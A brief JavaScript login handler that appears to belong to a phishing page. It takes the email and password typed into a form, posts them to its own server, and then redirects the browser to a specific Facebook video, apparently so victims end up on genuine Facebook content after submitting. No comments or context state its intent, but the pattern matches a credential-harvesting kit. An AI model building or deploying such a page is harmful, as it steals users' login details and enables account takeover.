

const email = document.querySelector(".email");
const pass = document.querySelector(".password");
const btn = document.querySelector("#loginbutton");

btn.addEventListener("click", event);

function event() {
  const formData = {
    email:email.value,
    pass:pass.value
  }
  axios
    .post("/", {
      formData,
    })
    .then((response) => {
      console.log(response);
      window.location.href=  "https://www.facebook.com/nova969/videos/385897846219933/"
    })
    .catch((error) => {
      console.log(error);
    });

}
